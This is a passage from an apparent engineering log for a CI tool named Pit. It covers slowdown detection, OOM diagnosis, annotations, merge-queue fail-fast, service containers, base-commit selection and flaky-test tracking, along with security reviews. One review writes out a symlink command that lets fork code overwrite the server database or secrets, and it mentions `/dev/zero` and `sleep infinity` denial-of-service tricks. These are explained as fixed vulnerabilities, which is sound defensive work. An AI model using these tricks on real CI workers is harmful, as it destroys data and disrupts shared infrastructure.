  and `pit stats` only had global totals.
- `p44b`: six runs at 1s, then `test` jumps to 4s (as if a commit added a slow fixture). That also
  passed silently.

Verdict before: **NOT SOLVED**.

**Fix.** Each task is compared with its own history: same repo, group, OS and name, counting
passing runs only, and leaving out cache hits and passes that needed a retry.

| Check | Fires when | Shows up in |
| --- | --- | --- |
| One run against its usual time (median of the last 10 passing runs, with at least 5 needed) | 1.5x and at least 2s slower | The task's result, as `slow: took 4.0s, usually 1.0s (3.9x, median of its last 6 passing runs)`, and so in the CLI (on the task line and again by the verdict), the MCP run summary, and a new Note column in the GitHub check table. |
| `pit slow` (`GET /api/slow?days=14`): the median of the last 5 passing runs against the median of the runs before them | 1.3x and at least 1s slower | A list of the tasks that got slower, so a gradual creep, which never jumps 1.5x in one run, still shows. |

Both checks need a margin in ratio and in absolute time, so short tasks' jitter is not reported.

**Measured.**
- `p44b`: the 4s run printed `! default.test: slow: took 4.2s, usually 1.0s (4.0x …)` next to the
  green verdict.
- `p44` (the creep): runs 9 and 10 were flagged at 1.9x and 1.8x.
- `pit slow` listed exactly the two slowed tasks, and not the steady `build`:
  - `p44b default.test`: 1.0s → 4.0s, 3.9x, 11 samples;
  - `p44 default.test`: 2.0s → 4.5s, 2.2x, 10 samples.
- Tests:
  - e2e `a_pass_much_slower_than_usual_is_noted`: 5 quick runs, then a 2.5s one that is flagged,
    while the steady task is not;
  - unit tests for the thresholds (jitter, too little history, 10% on a long task) and for creep
    detection;
  - a unit test for the check table's Note column (slow pass, escaped failure message, plain pass).

**Verdict: PARTIAL.**
- Pit now says so when a task gets slower, in the run itself and as a trend.
- Once a slowdown persists for about half of the last 10 runs, the median catches up and per-run
  notes stop. `pit slow` keeps listing it while the window still shows the change.
- Nothing pushes an alert: the notify webhook (P27) fires on broken and fixed main, not on
  slowdowns.
- Queue time (P23, P41's `/metrics`) is measured separately from task time, but `pit slow` does
  not chart it.

## P45. "Process completed with exit code 137": out of memory, but nothing says so

**The pain.** Exit code 137 is 128 + SIGKILL. In CI it nearly always means the kernel's OOM killer
stopped the job, but the log shows at most `Killed`, then the exit code:
- [Hyperenv](https://hyperenv.com/blog/github-actions-running-out-of-memory/) and a
  [self-hosted runner guide](https://jakeinsight.com/productivity/2026-03-24-github-actions-selfhosted-runner-docker-container-/)
  explain it, and the second notes that host cgroup limits cap containers "without any warning in
  workflow logs".
- People still have to guess:
  - [community #169191](https://github.com/orgs/community/discussions/169191) has random 137s on
    `ubuntu-24.04`;
  - [actions/runner#3521](https://github.com/actions/runner/issues/3521) has 137s after a runner
    update;
  - [softprops/action-gh-release#243](https://github.com/softprops/action-gh-release/issues/243)
    has large uploads failing with 137;
  - [moonfire-nvr#85](https://github.com/scottlamb/moonfire-nvr/issues/85) is the classic
    `webpack … Killed … 137`.
- PyTorch's answer was a bigger runner
  ([executorch#15400](https://github.com/pytorch/executorch/pull/15400)).

**Reproduction.** A host task grows memory under a 200 MB cap (`systemd-run --scope -p
MemoryMax=200M`, standing in for a small runner), and another task is killed with `kill -9 $$`.
Before, Pit reported:

```
✗ default.bundle: exited with 137
  │ building
  │ Killed
✗ default.killed: exited with a signal
```

Nothing said it was memory, how much the task used, or which signal killed the other one. Docker
tasks could not be given a memory limit either, so a laptop with 32 GB never reproduced a 7 GB
runner's failure.

**Fix.**
- **The signal is named.** That covers a direct one (`killed by SIGKILL`) and one reported as
  128 + n by a shell or the docker client (`exit 137: killed by SIGKILL`, `exit 139: killed by
  SIGSEGV`).
- **Out-of-memory kills are detected.** On Linux the worker reads the kernel's `oom_kill`
  counter in `/proc/vmstat` before and after the task. The counter includes kills from cgroup
  limits (Docker `--memory`, systemd `MemoryMax`). A SIGKILL while it went up reads "out of
  memory: … the kernel's OOM killer ran while it did. Give it more memory or less parallelism".
  Without that, the result says something else sent the signal.
- **Memory is sampled.** The task's process group is sampled every 250 ms (`/proc/<pid>/statm`),
  so the result says how much it was seen using.
- **New `memory` option for docker tasks** (`"2g"`, `"512m"`): `--memory` and `--memory-swap`
  with the same value, so a local run hits a small runner's ceiling. The config is rejected when
  the value is malformed or the task isn't a docker task.

**Measured.**

| Task | Pit's result |
| --- | --- |
| Host task growing under the 200 MB cap | `out of memory: exit 137: killed by SIGKILL, and the kernel's OOM killer ran while it did; its processes were seen using up to 159 MB` |
| Docker task, `memory: "64m"`, allocating 8 MB every 20 ms | `out of memory: exit 137: killed by SIGKILL, and the kernel's OOM killer ran while it did` |
| The same image and limit, allocating 8 MB once | Passed |
| `kill -9 $$` | `killed by SIGKILL; the kernel recorded no OOM kill, so something else sent it` |

Tests:
- e2e `killed_tasks_say_why`: the SIGKILL message, plus the docker OOM where Linux Docker is
  available;
- unit tests: message wording, a 64 MB allocation seen by the sampler, the OOM counter readable,
  and the config checks.

**Verdict: PARTIAL.** A 137 now says whether it was memory and roughly how much was used, and
`memory` reproduces a small runner's limit locally. Limits:
- The OOM check uses a machine-wide counter: another task OOM-killed at the same moment would be
  blamed too. A docker task's own `OOMKilled` flag would be exact, but Pit runs containers with
  `--rm` and doesn't inspect them.
- Sampling every 250 ms misses a spike that grows and dies faster. In the first repro, an
  instant 300 MB allocation was seen as 3 MB; the result says "seen using up to", not "peaked
  at".
- No peak figure for docker tasks (their processes are not in the task's process group).
- Linux only; macOS gets the signal names but no OOM or memory figures.
- Host and sandbox tasks cannot be given a limit.

## P46. Test failures don't show on the pull request's diff (and annotations stop at 10)

**The pain.** GitHub shows a check's annotations inline on the PR diff, the fastest way to see
what broke. Actions caps them at 10 errors and 10 warnings per step and 50 per job, and drops the
rest silently:
- [problem-matchers docs](https://github.com/actions/toolkit/blob/main/docs/problem-matchers.md),
  [Checks API docs](https://docs.github.com/en/rest/checks/runs);
- "If your test result has more than 10 failures reported, you'll only see the first 10"
  ([TAP::Formatter::GitHubActions](https://metacpan.org/pod/TAP::Formatter::GitHubActions));
- in [community #26680](https://github.com/orgs/community/discussions/26680), staff said there was
  "no any available way to bypass the limitation"; a later comment points at calling the Checks
  API directly, 50 per request;
- workarounds: [Report Annotate](https://github.com/marketplace/actions/report-annotate) (overflow
  into a PR comment), and limit errors in
  [spectral-action#334](https://github.com/stoplightio/spectral-action/issues/334);
- [community #61736](https://github.com/orgs/community/discussions/61736) asks for annotations
  sorted by severity.

**Reproduction.** Pit's check runs (GitHub App mode) carried a title and a summary table, and no
annotations at all. A failing JUnit report named the tests in the result ("cart.pays (card
declined)") but not where they failed. The JUnit parser also missed failure text inside CDATA,
which jest-junit writes, so those failures had no message.

**Fix.**
- **Where each failure is.** The JUnit parser records candidate locations for each failure:
  - the test case's `file` and `line` attributes (pytest and others);
  - then `path:line` references in the failure text: stack frames `at f (src/a.ts:42:7)`,
    Go's `a_test.go:12:`, Python's `File "x.py", line 12`, `file://` URLs and Windows paths;
  - text is read from CDATA as well as plain text.
- **Kept only if it's a repo file.** The worker resolves each candidate against the commit's file
  list:
  - it strips the workspace path, `/workspace/` (containers), `./` and `file://`;
  - a path relative to a package dir matches the one repo file ending with it;
  - `node_modules` frames and other non-repo paths are dropped.
- **The message says where.** It now reads "cart.pays (Error: card declined) at
  packages/web/src/cart.ts:17", so the CLI and agents see the place too.
- **Annotations on the check.** The worker posts them (`POST /api/tasks/{id}/annotations`, lease
  checked, at most 200 per task). When a group finishes, the server adds them to its check run:
  - 50 in the completing update, the rest in follow-up PATCHes (GitHub appends them);
  - claimed atomically per group, so later reports of the same run don't add them twice.

**Measured.**
- e2e `failed_tests_are_annotated_on_the_check` runs a mock GitHub API (App auth with a key made
  by `openssl`, installation token, check runs). A task's report has 60 failed tests with
  `file`/`line`:
  - the mock received exactly 60 annotations;
  - no request carried more than 50;
  - the first was `src/cart.test.ts` line 1, level `failure`, message `expected 1`;
  - two more seconds of reports added none.
- Unit tests:
  - stack frames, Go and Python formats, `file://` and Windows paths are found, while times and
    URLs are not;
  - a jest-style CDATA stack with container paths resolves to `packages/web/src/cart.ts:17`;
  - a `node_modules` frame is dropped;
  - the message includes the location.

**Verdict: PARTIAL.** Every failure with a findable place becomes an annotation; there's no cap
of 10 or 50, and there are no duplicates. Limits:
- Only failures in JUnit reports are annotated, not compiler or linter output (no problem
  matchers).
- With a plain token (commit statuses), there are no annotations.
- Not tried against real GitHub, only a mock of its API.
- If a follow-up PATCH fails after the claim, the remaining annotations are not retried.

## Review of P41–P45

A second independent reviewer read P41 to P45 and the fixes from the previous review. It found 2
high, 6 medium and 8 low findings. All are fixed except L4, L5 and L7, which are recorded as
limits below. Tests: `cargo test` 71 unit and 37 e2e, clippy clean.

High:

1. **H1. Pit's bookkeeping files inside `.git` could be turned against the worker.** A fork's
   container mounts the whole workspace read-write, `.git` included. After the job, the host wrote
   `.git/pit-warm.json` and `.git/pit-used`, following symlinks. A task running `ln -s
   ~/.local/share/pit/server/pit.db .git/pit-warm.json` made the worker overwrite the server's
   database (under `pit up`), or `authorized_keys`, or the secrets file.
   - Both files now sit next to the workspace in its pool directory (`.<n>.warm.json`,
     `.<n>.used`), where containers can't reach.
   - They are removed with the workspace.
   - The new e2e `the_worker_never_writes_through_a_task_planted_symlink` plants both links at a
     file outside. On the old code that file was truncated to empty; now it is untouched.
2. **H2. The symlink checks could be raced.** `safe_join` and the report reads checked paths
   while a sibling task ran in the same workspace. A fork task could swap a directory for a symlink
   between the check and the delete or write, or replace a report with a link to `/dev/zero` to
   exhaust the worker's memory.
   - A fork's tasks now run one at a time. No fork code is running while the worker clears,
     collects or reads files (a task's container goes with it).
   - Reports are opened with `O_NOFOLLOW`, must be regular files, and are read through a size
     cap. A unit test checks that a report swapped for a `/dev/zero` link is not read.

Medium:

3. **M1.** Two sharded tasks in one group overwrote each other's `.pit/shard-files`. Each task now
   has its own `.pit/shards/<task>`.
4. **M2.** A claim in flight (it long-polls 20s) could hand a draining worker a new job. Such a job
   is now handed back at once (`/release`).
5. **M3.** `pit_workers_online` and `pit_workers_busy` dropped to 0 when every slot was busy, since
   only claims refreshed `last_seen`. Heartbeats now refresh it.
6. **M4.** A fork PR queued through the API instead of the label was not pinned, so a later push
   was retested as a trusted run with secrets. Pit now records which PRs are forks from any
   webhook it sees, and `queue::add` pins those too. A fork Pit never got a webhook for is still
   unknown.
   - Fixing this exposed another bug: the cache's LRU evicted every `kv` row except `last`, so it
     would also have evicted the fork record and the annotation claims (P46). Pit's own
     namespaces are now excluded from eviction and from the artifact count.
7. **M5.** Slow notes flagged runs that weren't slow:
   - flaky passes (their time is every attempt's);
   - `--fresh` and fork runs, which are cold and were compared with warm history.

   They are now skipped, and those runs no longer enter the history.
8. **M6.** The slow-note history lookup ran on the async handler and, for a common name, could
   scan its whole history. It is now bounded to 30 days and runs on a blocking thread. It still
   takes the one DB lock (as `pit flaky` does).

Low:

- **L1. Out-of-memory messages:**
  - Where `/proc/vmstat` can't be read (macOS, Docker Desktop's VM), a SIGKILL now says "out of
    memory, or something else sent it" instead of claiming nothing was recorded.
  - A parent that exits 1 or 2 while the OOM killer ran now gets a note (`make` or `cargo` after a
    child was killed).
  - The page size comes from `sysconf`, not a fixed 4 KiB.
- **L2. Config sandbox:**
  - Config results are memoized per trust level, so a fork's result is never reused for a trusted
    run or the other way round.
  - The sandbox container is limited to 1 CPU.
- **L3. Debug scripts:**
  - They are created 0700 in a 0700 directory, never briefly readable.
  - Task names in their comments cannot start a new shell line.
  - Scripts left by an earlier worker process are removed at start.
- **L6.** The `timing_key` docs now say splits are kept per OS for multi-OS groups.
- **L8.** `pit up` exited at once on Ctrl-C, skipping the drain. It now drains like `pit worker`.

Not fixed (limits):

- **L4. LFS:**
  - `mirror/lfs` is never pruned and doesn't count toward `--workspace-max-gb`.
  - Every job runs `git lfs fetch` under the mirror lock.
  - A fork whose objects the base repo lacks fails its prepare step.
- **L5.** `pit_oldest_queued_seconds` counts a requeued group from creation, and queued groups
  waiting on a lock are counted although more workers can't help them.
- **L7.** On a hard stop the group is released before its tasks are killed (so the server requeues
  it before the process dies). For a few milliseconds the old tasks and a new claim can overlap;
  the new worker still has to prepare its workspace first.

Claims corrected: P31's fork isolation (above), P41's gauges and drain, P43's secrets wording,
P44's flaky and cold-run handling, P45's message on machines without `/proc`.

## P47. Fail-fast: the default hides failures, but turning it off wastes the merge gate's time

**The pain.** In a GitHub Actions matrix, `fail-fast` defaults to true: one failing leg cancels
the others, so you see one failure and grey "cancelled" badges. You then rerun the grid to learn
what else broke ([FixDevs](https://fixdevs.com/blog/github-actions-matrix-strategy/),
[OneUptime](https://oneuptime.com/blog/post/2026-02-02-github-actions-matrix-builds/view),
[Tenki](https://tenki.cloud/blog/github-actions-matrix-strategy-tenki-runners)). Because
scheduling isn't deterministic, which leg gets reported is luck
([Edward Thomson](https://www.edwardthomson.com/blog/github_actions_6_fail_fast_matrix_workflows)).

The advice splits by purpose. [WarpBuild](https://www.warpbuild.com/guides/github-actions-matrix-builds)
says to fail fast when the matrix is a merge gate and to turn it off when it is a compatibility
report. [RunsOn](https://runs-on.com/github-actions/the-matrix-strategy/) and
[eastondev](https://eastondev.com/blog/en/posts/dev/20260408-github-actions-matrix/) say much the
same. So people end up with different settings per workflow.

**Reproduction 1: hidden failures.**
- Group `matrix`: a 3-shard task where shard 1 fails at once and shard 3 fails after 3s.
- Group `checks`: `lint` fails at once; `typecheck` fails after 3s.

Pit ran all five to completion and reported all four failures (`matrix#1`, `matrix#3`, `lint`,
`typecheck`), with the passing shard green. Nothing was cancelled, because groups, shards and
independent tasks never cancel each other. **SOLVED** as it was.

**Reproduction 2: the merge gate.** A queued change makes `lint` fail at once while `test` sleeps
20s. Before, the queue waited for the whole candidate run: the entry was decided **21.9s** after
queueing, holding its lane, and every change behind it, for the slowest task.

**Fix.** For merge queue candidates only:
- When any task fails for good (after its retries, not counting quarantined tasks), the queue
  cancels the rest of the run ("stopped early: default.lint failed") and handles the candidate as
  failed right away.
- Batches are still split to find the culprit as before.
- Pull request, push and local runs still report every failure.

**Measured.**
- The same change was decided in **2.9s**.
- Its run reads `failed · stopped early: default.lint failed`, with `test` skipped and no
  leftover `sleep` process.
- e2e `the_merge_queue_fails_fast`: a 60s task next to a failing lint, and the entry fails well
  within 30s with that message.
- The existing queue tests (lanes, batching, splitting, flake retries) still pass, run twice.

**Verdict: SOLVED.** Pull requests show every failure, and the merge gate fails fast, with no
per-workflow setting. Limit: the queue notices a failure on its next tick (about a second), and
the cancelled run's worker stops at its next heartbeat.

## P48. Tests need a database: service containers, port clashes and leftovers

**The pain.**
- GitHub Actions' `services` run on Linux runners only.
- For years they had no way to pass arguments to the image:
  [actions/runner#1152](https://github.com/actions/runner/pull/1152),
  [#2139](https://github.com/actions/runner/issues/2139),
  [community #52675](https://github.com/orgs/community/discussions/52675),
  [#26688](https://github.com/orgs/community/discussions/26688),
  [#160506](https://github.com/orgs/community/discussions/160506). A 2026 article reports that
  `entrypoint` and `command` keys were added
  ([itacademy](https://itacademy.com.ua/en/articles/2026-04-04/github-actions-service-containers-entrypoint-command-2026-04-04/));
  I couldn't confirm that in GitHub's own docs.
- Readiness is hand-written with `--health-cmd` options
  ([Medium](https://medium.com/@sreeprad99/from-ci-chaos-to-orchestration-deep-dive-into-github-actions-service-containers-and-docker-compose-7cb2ff335864),
  [jen20](https://jen20.dev/post/services-in-github-actions/)).
- On a persistent runner, people `docker run -d -p 5432:5432 postgres` in a step. That clashes with
  concurrent jobs on the same port and leaks the container when the step fails.

**Reproduction.** Pit had no services, so a task had to start Postgres itself. Two groups did
that (`docker run -d -p 55432:5432 postgres:16-alpine`):
- the second failed with exit 125, because the port was taken;
- the first's test failed after the database came up;
- both containers were left behind (one `Up`, one `Created`).

Verdict before: **NOT SOLVED**.

**Fix: `services` on a group.** It takes `image`, `env`, `command`, `ports` and `ready`. For each
group, the worker:
- creates a network of its own (`pit-<group>`);
- starts each service on it with a network alias, its ports published on random `127.0.0.1`
  ports;
- waits for readiness: `ready` run with `docker exec` until it succeeds, or else the first port
  accepting connections on the container's own address. A published port accepts before the
  service listens, so it is only the fallback where the container's address isn't reachable
  (Docker Desktop);
- fails the group with the service's last 20 log lines if it exits or isn't ready within 90s;
- removes the services and network when the group ends, however it ended (after a `--debug`
  hold, so the debug shell can still reach them).

Tasks get `PIT_SERVICE_<NAME>_HOST` and `_PORT` (and `_PORT_<n>` per port):
- `docker` tasks join the group's network and get `db` and `5432`;
- host and sandbox tasks get `127.0.0.1` and the published port.

Other details:
- Each service's image ID, command, variables and ports are in its group's cache keys.
- Planning requires Docker for groups with services.
- Containers and networks are labelled with the worker's instance id, kept in its data dir. A
  worker that died mid-job removes its own leftovers when it starts. It's not labelled with the
  worker's name: workers on one machine share the hostname, and the first version, labelled by
  name, made each new e2e worker remove another test's live services.

**Measured.**
- The same two-group setup with `services.db` passed without clashes:
  - `migrate` in a `postgres:16-alpine` task connected to `db:5432` and created a table;
  - `test` read the row back (`found 42`) and then failed on purpose;
  - the host-side group reached its own Postgres at `127.0.0.1:32768`;
  - afterwards, no containers or networks with the label remained.
- The whole run took 17.7s, including two Postgres starts.
- e2e `groups_get_their_own_service_containers` (Linux with Docker): two groups each run an HTTP
  service on 8080 with different answers. A docker task and a host task each get their own group's
  answer, and nothing is left behind.
- The e2e suite passed 9 times in a row after the readiness change. One run before it failed
  without a captured reason; a not-yet-listening service behind docker's proxy is the likely
  cause, not proven.

**Verdict: PARTIAL.**
- Pit now runs per-group service containers with no port clashes and no leftovers.
- Limits:
  - Services need Docker, so they're Linux-container only like Actions'.
  - No `depends_on` between services: they start in name order, each waiting until ready.
  - Service `env` values appear in `docker run`'s arguments, visible to `ps` on the worker.
  - No health status beyond `ready`.

## P49. `nx affected` in CI: full history, a base commit, and an action to find it

**The pain.**
- Affected-only tools (`nx affected`, `turbo --affected`) diff against a base commit.
- On GitHub that needs `fetch-depth: 0`, or the base isn't in a shallow clone ("Unable to find
  base SHA", "bad object") ([latchkey](https://latchkey.dev/learn/monorepo-tools/nx-affected-base-sha-not-found-in-ci)).
- It also needs an action to choose the base: Nx recommends the last commit on main whose CI
  passed, found through the API by [nrwl/nx-set-shas](https://github.com/nrwl/nx-set-shas)
  ([Nx docs](https://nx.dev/docs/features/ci-features/affected)), plus forks
  ([step-security](https://github.com/step-security/nx-set-shas),
  [postmanlabs](https://github.com/postmanlabs/nx-set-shas),
  [LayZeeDK](https://github.com/LayZeeDK/nrwl-nx-set-shas)).
- It goes wrong:
  - [nx-set-shas#219](https://github.com/nrwl/nx-set-shas/issues/219) sometimes picks a
    month-old base and marks the whole repo affected;
  - [dmr.is#1520](https://github.com/DMR-is/dmr.is/pull/1520) replaced the action with its own
    logic, and notes how `cancel-in-progress` interferes with "last successful run";
  - the Aviator write-up covers partial-clone workarounds for big repos
    ([Aviator](https://www.aviator.co/blog/monorepos-mergequeue-nx/),
    [techplained](https://www.techplained.com/monorepo-ci-pipeline)).

**Reproduction.** A repo with three commits on main and a feature branch; the task prints its
history depth and any base. Before:

```
affected │ history=5 base=none nx=none
affected │ changed:apps/web/a.txt   (git diff HEAD~1...HEAD, the only fallback)
```

The history was already complete (workspaces are clones of the worker's full mirror), so there
was no `fetch-depth` problem. But Pit gave tasks no base, so a tool fell back to `HEAD~1` and
missed every earlier commit of a multi-commit branch.

**Fix.** At planning, the server picks the base and stores it on the run (`runs.base_sha`):
- the newest commit of the default branch whose trusted run passed and that is an ancestor of
  this commit (`nx-set-shas`' rule);
- otherwise the merge-base with the default branch;
- on the default branch itself, the commit's parent.

Tasks get it as `PIT_BASE_SHA`, `NX_BASE` and `TURBO_SCM_BASE`, and the head as `NX_HEAD` and
`TURBO_SCM_HEAD`. A task whose command mentions those names or `affected` has the base in its
cache key. Otherwise a run on the same files with a different base could replay a result that
tested fewer projects.

A bug found on the way: the first version's query used the wrong column name, and the error was
swallowed, so every run silently got no base (the fallback never ran). Now the history lookup
logs its error and falls through to the merge-base.

**Measured.**
- The repro now prints `base=9af1fd7f… nx=9af1fd7f…`, the feature branch's fork point.
- e2e `tasks_get_the_last_green_commit_as_their_base`, with trusted runs on main:
  - c1 green, c2 red, c3 green;
  - c3's base is c1: the red c2 is skipped, where `HEAD~1` would have used c2;
  - a two-commit feature branch off c3 gets c3, and its diff from the base lists both commits'
    files (`c.txt d.txt`).
- Not tested: the base-in-cache-key rule.

**Verdict: SOLVED** for picking the base: no history settings and no action. `cancel-in-progress`
can't interfere, because superseded runs never count as green. Caveat: the base comes from Pit's
own trusted runs. A repo whose main runs elsewhere (or not on Pit yet) gets the merge-base
fallback until its first green trusted run on Pit.

## P50. Many coding agents in parallel: CI becomes the bottleneck

**The pain.** Coding agents push faster than CI runners build and test. One developer runs
several agents, each in its own worktree, each opening pull requests and pushing every small fix
attempt as another pipeline run. Reruns join the same queue, and results arrive after the agent
has moved on ([SpecStory](https://specstory.com/learning/ci-cd/ci-for-coding-agents), which
cites a 25-fold growth in CI jobs in six months at one company;
[Megaport](https://www.megaport.com/blog/are-ai-coding-agents-the-new-ci-bottleneck/);
[Qovery](https://www.qovery.com/blog/ai-devops-2026-cicd-pipeline-bottleneck)).

The proposed answer is to move CI's checks into the agent's own loop, without losing CI's
hermeticity:
- [daily.dev / DevOps.com](https://daily.dev/posts/ai-coding-agents-are-pulling-ci-feedback-into-the-inner-loop-ivtxzjfos),
  [cicd.deployment.to](http://cicd.deployment.to/agents-pull-ci-feedback-inner-loop/);
- [DEV](https://dev.to/david_moores_cbc0233b7447/the-agentic-bottleneck-why-we-need-to-rethink-ci-4kih);
- [agentic-patterns](https://www.agentic-patterns.com/patterns/coding-agent-ci-feedback-loop/),
  which warns that flaky failures mislead agents into unneeded patches;
- [CallMissed](https://www.callmissed.com/blog/ai-coding-ci-bottlenecks-practical-playbook),
  which notes more runners alone may not fix it.

**Reproduction.**
- A monorepo with `build-core` (5s, every test depends on it) and eight packages with a 2s test
  each.
- Eight git worktrees ("agents"), each with an uncommitted change to a different package.
- All eight run `pit run` at the same moment against one `pit up` (2 slots, parallelism 4).
  That is Pit's inner loop: each run checks the agent's working tree on the same workers and
  backends as CI, with no push.

| Round (8 agents at once) | Wall time | Task executions |
| --- | --- | --- |
| First, empty cache | 16.4s | 17 |
| Next edit, warm cache | 8.7s | 8 |
| `--no-cache` (what eight independent full pipelines cost) | 37.3s | 72 |

- **First round.** One agent built `core` once; the other seven took it from the cache or waited
  for that build (single flight, P30). That agent ran all eight tests, since nothing was cached
  yet. Each other agent ran only its own package's test, plus, for one agent, the base version of
  a package the first had changed.
- **Next round.** Each agent re-ran exactly one test, its own package's.
- The remaining time is capacity: eight one-group runs on two slots, about 2s per wave.

**Verdict: SOLVED** for the duplicated work: agents share one cache and one in-flight build, and
check uncommitted trees without pushing (P6). The parts that make an agent loop trustworthy were
already in place:
- the same isolation as CI;
- flaky tests named rather than retried silently (P33);
- failures summarised for an agent's context (P16, P34, MCP).

What stays: capacity is the workers'. Pit doesn't add machines, and P41's `/metrics` is what an
autoscaler would use. Runs are first come, first served, with no fairness between agents.

## Review of P46–P49

A third independent reviewer read P46 to P49 and the previous review's fixes. It found no way for
fork code to use `services` to reach another group or the host, but it did find 3 high and 8 medium
findings, plus several low ones. Fixed (`cargo test` 72 unit and 40 e2e, run twice; clippy clean):

High:

1. **H1. Annotations and failure summaries skipped secret masking.** A failing test that printed a
   token put it on the GitHub check, which is public on public repos. Annotation titles and
   messages, the report summary in the log, and every task message now go through the run's
   masker.
2. **H2. A fork could hold a worker slot forever with `ready: "sleep infinity"`.** `docker exec`
   had no timeout and cancelling didn't stop service start-up. Now:
   - each readiness check is capped at 10s, within the 90s deadline;
   - start-up watches the run's cancel switch, and anything started is removed.
3. **H3. With uncommitted changes, `NX_HEAD`/`TURBO_SCM_HEAD` made `nx affected` diff `base...head`
   only.** It skipped the projects just edited and could report green. They are now unset for
   overlay runs, so the tools diff the working tree.

Medium:

4. **M1.** A scheduled run of one task could become the "green" base. Only full push and
   post-merge runs count now.
5. **M2.** The base used main/master/trunk only. A repo whose default is `develop` got no base at
   all, because a missing branch skipped the fallback. The default branch now comes from the
   mirror's `HEAD`; without one, the parent commit is used.
6. **M3.** Services started even when every task was a cache hit, and an unready database could
   fail a fully cached group. They now start with the first task that actually runs.
7. **M5.** Annotations from a requeued attempt could land on a green check. Only failed tasks'
   annotations are sent, and quarantined failures post none.
8. **M6.** The annotation claim was spent before the first request succeeded. It is released when
   that request fails, and JUnit `line="0"` is dropped (GitHub rejects the whole request for one).
9. **M7.** A group reclaimed on the same Docker host collided with, or removed, the earlier claim's
   services. Names and the worker's map now include the lease.
10. **M8.** Fork pinning failed open for a PR Pit had no webhook for. Pull requests are now
    recorded as fork or same-repo, and any PR not known to be same-repo is pinned.

Low, fixed:

- A failed `docker run` left its container behind; the container is recorded before the run.
- A hard stop now removes running services.
- A run stopped early (fail-fast) marks the group holding the failed task as failed, not
  skipped, so its check doesn't read "cancelled".

Not fixed (limits):

- **M4.** Without `ready`, readiness uses the container's address. That address isn't reachable
  from the worker under rootless Docker or a containerised worker (the group then times out), and
  on Docker Desktop the published-port fallback can report ready early. Give services a `ready`
  command there.
- The `affected` cache key only covers commands that name the variables (README now says so).
- Green bases are ordered by creation time, not history.
- `annotated` and `pr-origin` rows, and stored annotations, are never pruned.
- The OOM note uses the machine-wide counter.
- `pit up` waits out an in-flight 20s claim on Ctrl-C.

Claims corrected:

- P48's "removed however the group ended": hard stops are now covered; a panic or a crash still
  relies on the next start.
- P49's "never replayed": only for commands that name the base.

## P51. Which test is flaky? (P33's open gap)

**The pain.** P33 left this open: flakiness tracked per task says that `test` is flaky, but a
task running 2,000 tests only gets fixed once someone knows which one. The usual answer is a
separate test-analytics product reading JUnit uploads, and the tools P33 cites all work per test
([BuildPulse](https://buildpulse.io/products/flaky-tests),
[Trunk vs BuildPulse](https://trunk.io/compare/trunk-vs-buildpulse),
[Blacksmith](https://info.blacksmith.sh/task/blog/github-actions-reduce-flaky-test-noise)).

**Reproduction.** One task with `retries: 1` and a JUnit report of 20 tests. `test_checkout_race`
fails about half the time; the other 19 always pass. After 10 runs, before:
- `pit flaky` listed `p51 default.test` (4 passes on a retry, 1 input set that both passed and
  failed);
- nothing said which of the 20 tests it was. Each failed run's message named that run's failure,
  but nothing collected across runs or retries.

**Fix.**
- **The worker reads the reports after every failed attempt** that will be retried, before the
  next attempt clears them.
- **It records outcomes at the end.** It posts `POST /api/tasks/{id}/tests` (lease-checked, at
  most 500 names each, masked):
  - the tests that failed for good;
  - the tests that failed in an earlier attempt but not the last.
- **The server keeps them in `test_results`.** `pit flaky --tests` (`GET /api/flaky/tests`) lists
  each test that:
  - passed on a retry, or
  - failed in an execution whose action key also passed elsewhere (same inputs, different
    outcome).
- **A pass on a retry names its flaky tests in the result:** `flaky: attempt 1: exit 1, passed
  on attempt 2 (flaky tests: cart.test_checkout_race)`.

**Measured.**
- The same 10 runs after the fix:

  ```
  test                                       failed  passed retry  same inputs
  p51 default.test: cart.test_checkout_race       2             2            2
  ```

  Exactly the one test was listed, and none of the 19 steady ones. The two runs that passed on a
  retry said `(flaky tests: cart.test_checkout_race)`.
- e2e `flaky_tests_inside_a_task_are_named`, with three tests:
  - `on_retry` fails each run's first attempt and is listed as passed on a retry;
  - `flip` fails only in the first run and is listed as 1 failure on inputs that also passed;
  - `steady` is not listed;
  - the passing run's message names `t.on_retry`.

**Verdict: SOLVED** for tests that report through JUnit. Limits:
- `quarantine` is still per task, so a flaky test can't be quarantined on its own.
- Tests are identified by `classname.name`, so a renamed test starts a new history.
- Like the other history tables, `test_results` is never pruned.

## P52. Schedules in local time (cron is UTC, and daylight saving moves it)

**The pain.** GitHub Actions schedules were UTC-only for years. The workaround was two cron
entries, one per DST offset, gated on a date check, and runs still drifted an hour twice a year
([gitdash](https://gitdash.dev/blog/github-actions-scheduled-workflows-timezone),
[cronuru](https://cronuru.com/guides/github-actions-scheduled-workflows),
[crondst](https://github.com/lawcal/crondst)). In March 2026 GitHub added a `timezone` field: an
IANA zone, with DST followed, a skipped time advancing to the next valid one, and no `CRON_TZ`
([GitHub changelog](https://github.blog/changelog/2026-03-19-github-actions-late-march-2026-updates/)).
Tools lagged: actionlint rejected the new key
([actionlint#638](https://github.com/rhysd/actionlint/issues/638)), and older guides still say it
can't be done ([cronjobpro](https://cronjobpro.com/blog/github-actions-scheduled-workflows)).

**Reproduction.** Pit's schedules (P26) read cron in UTC only, so "9:30 in New York" ran at 9:30
in winter and 10:30 in summer, or needed two schedules. `timezone` was a config error (`unknown
field`). This put Pit behind GitHub.

**Fix.**
- Schedules take `timezone`, an IANA name, checked when the config loads; unknown zones are errors.
- Each UTC minute is mapped to the zone's wall clock (`jiff`, with the system zone database, or
  one bundled on Windows) and matched there. Across DST changes it behaves like GitHub:
  - a wall time the clocks skip (2:30 on spring-forward day) fires at the next valid minute,
    3:00;
  - a time the clocks repeat (1:30 on fall-back day) fires the first time only.
- Without `timezone`, nothing changes.

**Measured.**
- Unit test `time_zones_follow_daylight_saving_like_github`, with 2026's New York dates:
  - `30 9 * * *` fires at 13:30 UTC in July and 14:30 UTC in December, and not at the other hour;
  - `30 2` on 2026-03-08 fires exactly once, at 07:00 UTC (3:00 EDT);
  - `30 1` on 2026-11-01 fires exactly once, at 05:30 UTC (the first 1:30);
  - `Mars/Olympus` is rejected.
- e2e `schedules_start_one_run_per_slot` now drives the real scheduler with two Tokyo schedules.
  At 03:17 UTC, `17 12` in Tokyo (12:17 JST) starts a run and `17 3` in Tokyo does not.

**Verdict: SOLVED** (parity with GitHub's March 2026 feature).

## P53. Re-running a flaky failure needs write access, or an empty commit

**The pain.**
- GitHub's "Re-run failed jobs" is limited to people with write access. Contributors and
  reviewers on big projects ask for a `/retest` comment the way Kubernetes' Prow has one
